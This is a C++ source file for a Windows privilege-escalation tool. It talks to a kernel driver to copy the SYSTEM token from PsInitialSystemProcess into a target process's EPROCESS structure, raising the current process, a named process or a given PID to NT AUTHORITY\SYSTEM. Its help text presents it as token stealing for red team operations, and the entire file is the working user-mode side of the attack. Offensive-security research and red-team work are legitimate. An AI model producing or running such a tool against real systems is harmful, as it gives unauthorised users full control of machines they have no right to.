#include <print>
#include <memory>
#include <string>
#include <string_view>
#include "../Memory/DriverInterface/driver_interface.hpp"

static std::wstring to_wide( std::string_view s )
{
	return { s.begin(), s.end() };
}

static void print_help( std::string_view prog )
{
	std::print( R"({0} - Elevate a process to NT AUTHORITY\SYSTEM via token stealing.

Description:
  Copies the SYSTEM token from PsInitialSystemProcess into the target
  process's EPROCESS Token field, granting it NT AUTHORITY\SYSTEM
  privileges. Useful for privilege escalation during red team ops.

Usage:
  {0} --self              Elevate the current process
  {0} <process_name>      Elevate by process name
  {0} --pid <pid>         Elevate by process ID
  {0} --help              Show this help

Arguments:
  --self           Elevate this example process itself
  process_name     Name of the process to elevate (e.g. cmd.exe)
  --pid <pid>      Process ID to elevate (decimal)

Examples:
  {0} --self
  {0} cmd.exe
  {0} --pid 1337
)", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
	{
		print_help( argv[0] );
		return ( argc > 1 && ( std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" ) ) ? 0 : 1;
	}

	const auto arg1 = std::string_view{ argv[1] };
	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		std::println( "[!] Could not connect to the driver!" );
		return 1;
	}

	DWORD target_pid = 0;

	if( arg1 == "--self" )
	{
		target_pid = GetCurrentProcessId();
		std::println( "[+] Elevating self (PID: {})", target_pid );
	}
	else if( arg1 == "--pid" )
	{
		if( argc < 3 )
		{
			std::println( "[!] --pid requires a process ID argument." );
			return 1;
		}

		target_pid = static_cast< DWORD >( std::stoul( argv[2] ) );
	}
	else
	{
		if( !driver->attach( to_wide( arg1 ) ) )
		{
			std::println( "[!] Could not find process '{}'!", arg1 );
			return 1;
		}

		target_pid = driver->get_pid();
		std::println( "[+] Found {} (PID: {})", arg1, target_pid );
	}

	if( driver->elevate_token( target_pid ) )
		std::println( "[+] PID {} elevated to NT AUTHORITY\\SYSTEM!", target_pid );
	else
	{
		std::println( "[!] Failed to elevate PID {}.", target_pid );
		return 1;
	}

	return 0;
}
